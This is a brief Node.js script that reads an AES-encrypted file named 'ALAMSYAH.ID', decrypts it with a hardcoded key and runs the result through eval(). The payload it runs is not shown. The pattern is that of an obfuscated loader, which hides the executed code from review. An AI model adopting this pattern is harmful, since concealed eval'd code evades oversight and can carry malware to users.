const fs = require('fs');
const CryptoJS = require('crypto-js');
const encryptedFilePath = 'ALAMSYAH.ID';
const encryptedData = fs.readFileSync(encryptedFilePath, 'utf8');
const secretKey = 'asdasdwasd';
const decryptedData = CryptoJS.AES.decrypt(encryptedData, secretKey).toString(CryptoJS.enc.Utf8);
eval(decryptedData);
